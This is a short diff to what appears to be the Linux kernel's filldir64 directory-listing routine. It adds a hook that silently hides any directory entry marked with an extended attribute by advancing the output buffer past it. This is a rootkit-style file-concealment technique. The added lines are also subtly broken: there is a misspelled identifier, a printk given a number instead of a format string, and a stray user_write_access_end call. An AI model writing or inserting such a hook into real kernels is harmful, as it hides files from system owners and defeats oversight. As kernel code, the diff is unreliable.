@@ -346,8 +346,15 @@ static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
         if (len >= 0) {
             // xattr exists, skip listing this directory entry
             // Check for different types depending on type
-            printk("hit");
-			return false;
+            user_write_access_end();
+
+			buf->prev_reclen = reclen;
+			buf->current_dir = (void __user *)dirent + reclen;
+			buf->count -= reclen;
+			printk(reclean);
+			printk(buf->count);
+
+			return true;
         }
     }
 
